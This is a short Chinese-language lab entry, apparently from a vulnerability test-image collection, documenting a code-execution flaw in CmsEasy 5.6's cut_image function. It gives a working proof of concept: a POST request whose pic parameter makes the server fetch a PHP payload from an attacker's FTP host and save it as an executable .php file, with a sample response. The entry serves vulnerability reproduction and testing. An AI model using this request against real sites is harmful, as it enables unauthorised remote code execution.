## CmsEasy 5.6  cut_image 代码执行漏洞

测试镜像

* src/cmseasy/5.6

影响版本

* CmsEasy <= 5.6

参考链接

* [CmsEasy < 5.6 20161012 cut_image 代码执行漏洞](https://github.com/Medicean/VulApps/tree/master/c/cmseasy/1)
* [CmsEasy前台无限制GetShell](https://xz.aliyun.com/t/416)
* [CmsEasy前台无限制GetShell【Getshell的补充说明】](https://xz.aliyun.com/t/365)

Poc

使用`cut_image代码执行漏洞`目录下的生成脚本`jpg_payload.php`生成payload，或直接使用已生成的`poc_phpinfo_700x1120.png`文件。

测试方法：

将生成的payload上传至攻击者的ftp服务器，并发起 POST 请求，地址为：

```
http://127.0.0.1/index.php?case=tool&act=cut_image
```

POST data:

```
pic=1ftp://攻击者FTP地址/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120
```

成功会返回如下形式的数据：

```
{"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}
```

根据返回的文件名，访问上传成功后的php文件

`http://127.0.0.1/upload/images/201612/148159258747.php`


